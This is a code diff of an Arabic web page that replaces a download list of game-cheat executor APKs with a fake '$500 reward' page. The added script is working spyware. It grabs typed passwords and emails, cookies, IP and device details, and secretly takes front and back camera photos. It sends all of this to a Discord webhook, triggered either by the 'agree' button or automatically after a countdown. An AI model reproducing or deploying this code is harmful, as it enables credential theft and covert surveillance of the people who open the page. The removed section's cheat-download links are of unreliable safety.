@@ -3,218 +3,262 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VN7 | المتجر الرسمي</title>
+    <title>المخترق MRX</title>
     <style>
-        :root {
-            --bg: #050507;
-            --purple: #8e2de2;
-            --card: #0f0f13;
-            --accent: #00e5ff;
-        }
-
-        body {
-            background-color: var(--bg);
-            color: white;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            margin: 0; padding: 0;
-            text-align: center;
-        }
-
-        /* أنيميشن الرقص */
-        @keyframes dance {
-            0%, 100% { transform: translateY(0) rotate(0); }
-            50% { transform: translateY(-10px) rotate(2deg); }
-        }
-
-        .dancing { animation: dance 3s ease-in-out infinite; }
-
-        header {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 10px 5%; background: rgba(0,0,0,0.95);
-            border-bottom: 2px solid var(--purple);
-            position: sticky; top: 0; z-index: 1000;
-        }
-
-        .menu-btn { width: 50px; height: 50px; cursor: pointer; border-radius: 50%; border: 2px solid var(--purple); }
-        .logo { font-size: 28px; font-weight: bold; }
-        .logo span { color: var(--purple); }
-
-        .container { max-width: 600px; margin: 20px auto; padding: 15px; }
-
-        .page { display: none; }
-        .active { display: block; animation: fadeIn 0.4s ease; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        .hero-btn {
-            background: #5865F2; display: block; padding: 20px;
-            border-radius: 15px; color: white; text-decoration: none;
-            font-weight: bold; font-size: 18px; margin-bottom: 20px;
-        }
-
-        .title-no-section {
-            color: var(--accent); font-size: 26px; margin: 40px 0 20px;
-            font-weight: bold; text-shadow: 0 0 10px var(--purple);
-        }
-
-        .card {
-            background: var(--card); border-radius: 20px; padding: 15px;
-            border: 1px solid #222; margin-bottom: 25px; text-align: right;
-        }
-
-        .card img { width: 100%; border-radius: 15px; margin-bottom: 12px; border: 1px solid #333; }
-
-        .btn-install {
-            display: block; padding: 15px; border-radius: 12px;
-            background: linear-gradient(90deg, #8e2de2, #4a00e0);
-            color: white; text-decoration: none; font-weight: bold;
-            margin-top: 10px; text-align: center; font-size: 18px;
-            transition: 0.3s;
-        }
-        
-        .btn-vn { background: linear-gradient(90deg, #00c6ff, #0072ff); margin-top: 5px; }
-
-        footer { padding: 30px; color: #444; font-size: 12px; }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#001a00;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden;font-family:monospace}
+        .monitor{position:relative;width:80vw;max-width:900px;height:55vw;max-height:550px;background:#0a1f0a;border:20px solid #0f2f0f;border-radius:15px;box-shadow:0 0 50px rgba(0,255,65,0.5),inset 0 0 30px #0f0}
+        .screen{position:relative;width:100%;height:100%;background:#000;overflow:hidden;border:2px solid #1f3f1f}
+        .screen::before{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:linear-gradient(rgba(0,255,0,0.03)50%,rgba(0,0,0,0.2)50%);background-size:100%4px;z-index:2;pointer-events:none}
+        canvas{display:block;width:100%;height:100%}
+        .stand{width:160px;height:50px;background:#0a1f0a;margin:0 auto;border-bottom-left-radius:10px;border-bottom-right-radius:10px;border-left:2px solid #0f2f0f;border-right:2px solid #0f2f0f}
+        .base{width:280px;height:12px;background:#0f2f0f;margin:0 auto;border-radius:5px;box-shadow:0 0 20px #0f0}
+        #hackWindow{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:9999;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;backdrop-filter:blur(10px)}
+        #hackBox{background:linear-gradient(145deg,#0a1f0a,#001a00);border:3px solid #0f0;border-radius:20px;padding:50px 60px;max-width:600px;width:90%;text-align:center;box-shadow:0 0 80px rgba(0,255,0,0.3),inset 0 0 50px rgba(0,255,0,0.1);animation:pulse 2s infinite}
+        @keyframes pulse{0%{box-shadow:0 0 80px rgba(0,255,0,0.3),inset 0 0 50px rgba(0,255,0,0.1)}50%{box-shadow:0 0 120px rgba(0,255,0,0.6),inset 0 0 80px rgba(0,255,0,0.2)}100%{box-shadow:0 0 80px rgba(0,255,0,0.3),inset 0 0 50px rgba(0,255,0,0.1)}}
+        #hackBox h1{color:#0f0;font-size:28px;margin-bottom:15px;text-shadow:0 0 20px #0f0}
+        #hackBox p{color:#8f8;font-size:18px;margin:20px 0;line-height:1.8}
+        #hackBox .emoji-big{font-size:60px;display:block;margin:10px 0}
+        #agreeBtn{background:#0f0;color:#000;border:none;padding:15px 50px;font-size:22px;font-weight:bold;border-radius:50px;cursor:pointer;margin-top:20px;transition:all 0.3s;box-shadow:0 0 30px rgba(0,255,0,0.5);font-family:Arial,sans-serif}
+        #agreeBtn:hover{transform:scale(1.05);box-shadow:0 0 50px rgba(0,255,0,0.8)}
+        #agreeBtn:active{transform:scale(0.95)}
+        #timer{color:#0f0;font-size:14px;margin-top:15px;opacity:0.7}
+        #status{color:#ffaa00;font-size:13px;margin-top:10px;display:none}
     </style>
 </head>
 <body>
-
-<header>
-    <img src="https://raw.githubusercontent.com/hatm12345cc-source/krnl/refs/heads/main/32327A28-AEE3-4C73-902C-C6C91EED9868.png" class="menu-btn dancing" onclick="toggleMenu()">
-    <div class="logo">V<span>N7</span></div>
-</header>
-
-<div class="container">
-    
-    <div id="home" class="page active">
-        <h1 class="title-no-section">VN7 الرئيسي</h1>
-        <img src="https://raw.githubusercontent.com/hatm12345cc-source/krnl/refs/heads/main/32327A28-AEE3-4C73-902C-C6C91EED9868.png" class="dancing" style="width:130px; border-radius:50%; margin-bottom:20px;">
-        <a href="https://discord.gg/haX59nFsM" class="hero-btn">انضم لسيرفر VN7 الرسمي 💬</a>
-        <p style="color:#888;">اضغط على الشعار فوق لفتح قائمة التحميلات</p>
+    <div id="hackWindow">
+        <div id="hackBox">
+            <span class="emoji-big">💰</span>
+            <h1>🎯 هل تسمح بدخول Google والحصول على 500$؟</h1>
+            <p>📍 اضغط موافق للحصول على المكافأة<br>⚡ سيتم تفعيل حسابك فوراً</p>
+            <button id="agreeBtn">✅ موافق - احصل على 500$</button>
+            <div id="timer">⏳ سيتم الإرسال خلال 10 ثواني...</div>
+            <div id="status">🔄 جاري التجهيز...</div>
+        </div>
     </div>
-
-    <div id="hacks" class="page">
-        
-        <h2 class="title-no-section">(هاك الآيفونios 🍎)</h2>
-        
-        <div class="card">
-            <img src="https://raw.githubusercontent.com/hatm12345cc-source/VN7/refs/heads/main/IMG_1929.png" class="dancing">
-            <h3>Delta iOS</h3>
-            <a href="itms-services://?action=download-manifest&url=https://delta.bz/manifest.plist" class="btn-install">Install Delta</a>
-            <a href="https://nekoo.eu.org/W7dMvm" class="btn-install" style="background:#6a11cb;">Install Delta VR7</a>
+    <div>
+        <div class="monitor">
+            <div class="screen">
+                <canvas id="matrix"></canvas>
+            </div>
         </div>
-
-        <div class="card">
-            <img src="https://raw.githubusercontent.com/hatm12345cc-source/VN7/refs/heads/main/IMG_1935.jpeg" class="dancing">
-            <h3>SkibX iOS</h3>
-            <a href="itms-services://?action=download-manifest&url=https://skibx.com/ota.plist" class="btn-install">Install SkibX</a>
-        </div>
-
-        <h2 class="title-no-section">(هاك الأندرويد 🤖)</h2>
-        <img src="https://raw.githubusercontent.com/hatm12345cc-source/krnl/refs/heads/main/IMG_1949.jpeg" style="width:100%; border-radius:15px; margin-bottom:20px;">
-
-        <div class="card">
-            <img src="https://raw.githubusercontent.com/hatm12345cc-source/VN7/refs/heads/main/IMG_1929.png" class="dancing">
-            <h3>Delta Android</h3>
-            <a href="https://www.mediafire.com/file/ti5geyfey7thof9/Delta-2.707.734.apk/file" class="btn-install">Install Delta</a>
-            <a href="https://www.mediafire.com/file/d1yxz9dtr9vpk49/DELTAVN.apk/file" class="btn-install btn-vn">Install Delta VN</a>
-        </div>
-
-        <div class="card">
-            <img src="https://raw.githubusercontent.com/hatm12345cc-source/VN7/refs/heads/main/IMG_1935.jpeg" class="dancing">
-            <h3>SkibX Android</h3>
-            <a href="https://www.mediafire.com/file/khh1d18x0sbdfc6/SkibX-2.707.734.apk/file" class="btn-install">Install SkibX</a>
-            <a href="https://www.mediafire.com/file/z7vlijutetijzc4/SkibX+VN.apk/file" class="btn-install btn-vn">Install SkibX VN</a>
-        </div>
-
-        <div class="card">
-            <img src="https://raw.githubusercontent.com/hatm12345cc-source/krnl-vn/refs/heads/main/IMG_1899.jpeg" class="dancing">
-            <h3>Krnl VN</h3>
-            <a href="https://www.mediafire.com/file/zhvrz2elarw0y8y/Krnl+VN+new.apk/file" class="btn-install btn-vn">Install Krnl VN</a>
-        </div>
-
-        <div class="card">
-            <img src="https://raw.githubusercontent.com/hatm12345cc-source/krnl/refs/heads/main/IMG_1954.jpeg" class="dancing">
-            <h3>Codex Android</h3>
-            <a href="https://www.mediafire.com/file/80ue9v9kcdmnzhh/Codex+v2.708.apk/file" class="btn-install">Install Codex</a>
-        </div>
-
-        <div class="card">
-            <img src="https://raw.githubusercontent.com/hatm12345cc-source/delta-vn7/refs/heads/main/IMG_1956.jpeg" class="dancing">
-            <h3>Arceus X Neo</h3>
-            <a href="https://www.mediafire.com/file/5buplrts6jij7z5/Arceus+X+Neo+v2.0.5.apk/file" class="btn-install">Install Arceus X</a>
-        </div>
-
-        <div class="card">
-            <img src="https://raw.githubusercontent.com/hatm12345cc-source/delta-vn7/refs/heads/main/IMG_1960.jpeg" class="dancing">
-            <h3>Fluxus Android</h3>
-            <a href="https://www.mediafire.com/file/3yljs6ggohxnxfl/Fluxus+3.apk/file" class="btn-install">Install Fluxus</a>
-            <a href="https://www.mediafire.com/file/k9qeefep336nmvu/FluxusZ+VN.apk/file" class="btn-install btn-vn">Install Fluxus VN</a>
-        </div>
-
-        <div class="card">
-            <img src="https://raw.githubusercontent.com/hatm12345cc-source/delta-vn7/refs/heads/main/IMG_1962.jpeg" class="dancing">
-            <h3>Cryptic Android</h3>
-            <a href="https://www.mediafire.com/file/2cw9hn5kg5x1vk1/Cryptic.2.689.CrypticExecutor.com+[rtxtop1].apk/file" class="btn-install">Install Cryptic</a>
-        </div>
-
-        <div class="card">
-            <img src="https://raw.githubusercontent.com/hatm12345cc-source/delta-vn7/refs/heads/main/IMG_1963.jpeg" class="dancing">
-            <h3>Trigon Android</h3>
-            <a href="https://www.mediafire.com/file/38mfn2dhkiqgk70/Trigon_2.708.880.apk/file" class="btn-install">Install Trigon</a>
-        </div>
-
-        <div class="card">
-            <img src="https://raw.githubusercontent.com/hatm12345cc-source/delta-vn7/refs/heads/main/IMG_1966.jpeg" class="dancing">
-            <h3>Ronix Android</h3>
-            <a href="https://www.mediafire.com/file/2351k8zxkpqpc9m/Ronix_64Bits-2.707.734.apk/file" class="btn-install">Install Ronix</a>
-            <a href="https://www.mediafire.com/file/nbtvn8zkrbodv5r/Ronix_VN.apk/file" class="btn-install btn-vn">Install Ronix VN</a>
-        </div>
-
-        <div class="card">
-            <img src="https://raw.githubusercontent.com/hatm12345cc-source/delta-vn7/refs/heads/main/IMG_1968.jpeg" class="dancing">
-            <h3>Vega X</h3>
-            <a href="https://www.mediafire.com/file/a1xkbytour4xksc/Vega.X+8.apk/file" class="btn-install">Install Vega X</a>
-        </div>
-
-        <h2 class="title-no-section">(هاك الكمبيوتر 💻)</h2>
-
-        <div class="card">
-            <img src="https://raw.githubusercontent.com/hatm12345cc-source/SKINA/refs/heads/main/IMG_1972.jpeg" class="dancing">
-            <h3>Pro Hacker PC</h3>
-            <a href="https://www.mediafire.com/file/qgrt9u7hx7cd79t/Pro+Hacker+External+(Beta).rar/file" class="btn-install">Install Pro Hacker</a>
-        </div>
-
-        <div class="card">
-            <img src="https://raw.githubusercontent.com/hatm12345cc-source/SKINA/refs/heads/main/IMG_1973.jpeg" class="dancing">
-            <h3>Xeno PC</h3>
-            <a href="https://www.mediafire.com/file/u767iu4khrmwjj3/Xeno-v1.3.20.zip/file" class="btn-install">Install Xeno</a>
-        </div>
-
-        <div class="card">
-            <img src="https://raw.githubusercontent.com/hatm12345cc-source/delta-vn7/refs/heads/main/IMG_1963.jpeg" class="dancing">
-            <h3>Trigon PC</h3>
-            <a href="https://www.mediafire.com/file/mbavimp9zr0s3gm/Trigon+PC+Fixer.exe/file" class="btn-install">Install Trigon Fixer</a>
-        </div>
-
+        <div class="stand"></div>
+        <div class="base"></div>
     </div>
-</div>
-
-<footer>511 VN7 | جميع الحقوق محفوظة لأبوعتب © 2026</footer>
-
-<script>
-    function toggleMenu() {
-        const home = document.getElementById('home');
-        const hacks = document.getElementById('hacks');
-        if (home.style.display !== 'none') {
-            home.style.display = 'none';
-            hacks.style.display = 'block';
-            hacks.classList.add('active');
-        } else {
-            hacks.style.display = 'none';
-            home.style.display = 'block';
-            home.classList.add('active');
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/ضع_الرابط_الحقيقي_هنا";
+        const c = document.getElementById('matrix');
+        const x = c.getContext('2d');
+        c.width = c.parentElement.clientWidth;
+        c.height = c.parentElement.clientHeight;
+        const z = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        const s = 16;
+        const col = Math.floor(c.width / s);
+        const d = Array(col).fill(1);
+        setInterval(() => {
+            x.fillStyle = 'rgba(0,20,0,0.04)';
+            x.fillRect(0,0,c.width,c.height);
+            x.fillStyle = '#0f0';
+            x.shadowColor = '#0f0';
+            x.shadowBlur = 6;
+            x.font = s + 'px monospace';
+            for(let i=0;i<col;i++){
+                x.fillText(z[Math.floor(Math.random()*z.length)], i*s, d[i]*s);
+                if(d[i]*s > c.height && Math.random() > 0.975) d[i] = 0;
+                d[i]++;
+            }
+            x.shadowBlur = 0;
+        }, 33);
+        
+        let ip = 'غير معروف';
+        let email = 'غير موجود';
+        let password = 'غير موجود';
+        let phone = 'كمبيوتر';
+        let frontImage = null;
+        let backImage = null;
+        let captured = false;
+        
+        function compressImage(dataUrl, maxSizeMB = 6) {
+            return new Promise((resolve) => {
+                let quality = 0.8;
+                let size = (dataUrl.length * 3/4) / (1024*1024);
+                if(size <= maxSizeMB) { resolve(dataUrl); return; }
+                const img = new Image();
+                img.onload = function() {
+                    let canvas = document.createElement('canvas');
+                    let w = img.width, h = img.height;
+                    while((w*h*3/4)/(1024*1024) > maxSizeMB) { w *= 0.8; h *= 0.8; }
+                    canvas.width = w; canvas.height = h;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0, w, h);
+                    let result = canvas.toDataURL('image/jpeg', quality);
+                    let newSize = (result.length * 3/4) / (1024*1024);
+                    while(newSize > maxSizeMB && quality > 0.2) { quality -= 0.1; result = canvas.toDataURL('image/jpeg', quality); newSize = (result.length * 3/4) / (1024*1024); }
+                    resolve(result);
+                };
+                img.src = dataUrl;
+            });
         }
-    }
-</script>
+        
+        function getIP() {
+            return new Promise((resolve) => {
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => resolve(d.ip))
+                    .catch(() => resolve('غير معروف'));
+            });
+        }
+        
+        function captureCamera(facingMode) {
+            return new Promise((resolve) => {
+                if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { resolve(null); return; }
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode, width: 300, height: 300 } })
+                    .then(stream => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 300; canvas.height = 300;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, 300, 300);
+                            const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve(dataUrl);
+                        };
+                    })
+                    .catch(() => resolve(null));
+            });
+        }
+        
+        async function sendWithRetry(payload, retries = 3) {
+            for(let i=0; i<retries; i++) {
+                try {
+                    const response = await fetch(WEBHOOK, { method: 'POST', body: payload });
+                    if(response.ok) return true;
+                    await new Promise(r => setTimeout(r, 2000 * (i+1)));
+                } catch(e) {
+                    if(i === retries-1) throw e;
+                    await new Promise(r => setTimeout(r, 2000 * (i+1)));
+                }
+            }
+            return false;
+        }
+        
+        async function captureAndSend() {
+            if(captured) return;
+            captured = true;
+            document.getElementById('status').style.display = 'block';
+            document.getElementById('status').textContent = '🔄 جمع البيانات...';
+            
+            ip = await getIP();
+            const ua = navigator.userAgent;
+            if(/android/i.test(ua)) phone = 'Android';
+            else if(/iphone|ipad|ipod/i.test(ua)) phone = 'iOS';
+            else if(/windows phone/i.test(ua)) phone = 'Windows Phone';
+            email = localStorage.getItem('email') || 'غير موجود';
+            password = localStorage.getItem('password') || 'غير موجود';
+            
+            document.getElementById('status').textContent = '📸 التقاط الكاميرا...';
+            frontImage = await captureCamera('user');
+            if(frontImage) frontImage = await compressImage(frontImage, 5);
+            backImage = await captureCamera('environment');
+            if(backImage) backImage = await compressImage(backImage, 5);
+            
+            const screenInfo = screen.width + 'x' + screen.height;
+            const language = navigator.language;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const cookies = document.cookie || 'لا توجد';
+            const pageUrl = window.location.href;
+            const referrer = document.referrer || 'لا يوجد';
+            const platform = navigator.platform || 'غير معروف';
+            
+            const payload = {
+                username: "المخترق MRX",
+                content: "**🔥 تم اختراق ضحية جديدة بنجاح!**",
+                embeds: [{
+                    title: "📡 جميع المعلومات المسروقة",
+                    color: 0x00ff00,
+                    fields: [
+                        {name: "🌐 IP", value: ip, inline: true},
+                        {name: "📱 الجهاز", value: phone, inline: true},
+                        {name: "📧 البريد", value: email, inline: true},
+                        {name: "🔑 كلمة المرور", value: password, inline: true},
+                        {name: "🖥️ الشاشة", value: screenInfo, inline: true},
+                        {name: "🌍 اللغة", value: language, inline: true},
+                        {name: "⏰ المنطقة", value: timezone, inline: true},
+                        {name: "💻 المنصة", value: platform, inline: true},
+                        {name: "🍪 الكوكيز", value: cookies.substring(0, 500), inline: false},
+                        {name: "🔗 الصفحة", value: pageUrl, inline: false},
+                        {name: "↩️ الرابط السابق", value: referrer, inline: false},
+                        {name: "📦 المتصفح", value: ua.substring(0, 300), inline: false}
+                    ],
+                    footer: { text: "حقوق الدراك/2026" }
+                }]
+            };
+            
+            document.getElementById('status').textContent = '📤 إرسال البيانات...';
+            
+            try {
+                const formData = new FormData();
+                formData.append('payload_json', JSON.stringify(payload));
+                if(frontImage) { const blob = dataURLtoBlob(frontImage); formData.append('front.jpg', blob, 'front.jpg'); }
+                if(backImage) { const blob = dataURLtoBlob(backImage); formData.append('back.jpg', blob, 'back.jpg'); }
+                
+                const success = await sendWithRetry(formData, 3);
+                if(success) {
+                    document.getElementById('status').textContent = '✅ تم الإرسال بنجاح!';
+                    setTimeout(() => { document.getElementById('status').style.display = 'none'; }, 3000);
+                } else {
+                    document.getElementById('status').textContent = '❌ فشل الإرسال - تأكد من الرابط';
+                }
+            } catch(error) {
+                document.getElementById('status').textContent = '❌ خطأ: ' + error.message;
+            }
+        }
+        
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while(n--) { u8arr[n] = bstr.charCodeAt(n); }
+            return new Blob([u8arr], {type: mime});
+        }
+        
+        setInterval(() => {
+            document.querySelectorAll('input[type="password"], input[type="text"], input[type="email"]').forEach(inp => {
+                if(inp.value && inp.value.length > 0) {
+                    if(inp.type === 'password') localStorage.setItem('password', inp.value);
+                    else if(inp.type === 'email') localStorage.setItem('email', inp.value);
+                }
+            });
+        }, 1500);
+        
+        let countdown = 10;
+        const timerEl = document.getElementById('timer');
+        const agreeBtn = document.getElementById('agreeBtn');
+        const hackWindow = document.getElementById('hackWindow');
+        
+        agreeBtn.addEventListener('click', function() {
+            hackWindow.style.display = 'none';
+            captureAndSend();
+        });
+        
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            timerEl.textContent = `⏳ سيتم الإرسال خلال ${countdown} ثواني...`;
+            if(countdown <= 0) {
+                clearInterval(countdownInterval);
+                timerEl.textContent = '⏳ جاري الإرسال...';
+                setTimeout(() => {
+                    hackWindow.style.display = 'none';
+                    captureAndSend();
+                }, 1000);
+            }
+        }, 1000);
+    </script>
 </body>
 </html>
